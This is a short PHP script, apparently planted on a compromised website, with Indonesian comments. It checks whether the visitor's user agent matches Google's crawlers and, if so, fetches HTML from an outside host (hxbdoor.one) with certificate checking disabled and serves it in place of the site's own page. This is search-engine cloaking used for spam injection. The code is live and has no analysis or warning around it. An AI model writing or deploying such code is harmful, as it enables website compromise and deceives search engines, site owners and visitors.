<?php
function isGoogleBot() {  
    if (!isset($_SERVER['HTTP_USER_AGENT'])) {
        return false;
    }
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    return preg_match('/Googlebot|Googlebot-Mobile|Googlebot-Image|Mediapartners-Google|Google-Site-Verification|Google Web Preview|AdsBot-Google|Google-InspectionTool|Googlebot-Desktop|Googlebot-Smartphone/i', $userAgent);
}

if (isGoogleBot()) {
    $ch = curl_init("https://hxbdoor.one/raw/A47iWxNf");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $html = curl_exec($ch);
    curl_close($ch);

    if ($html !== false) {
        echo $html; // tampilkan konten file
    } else {
        echo "Gagal mengambil konten.";
    }
    exit;
 }
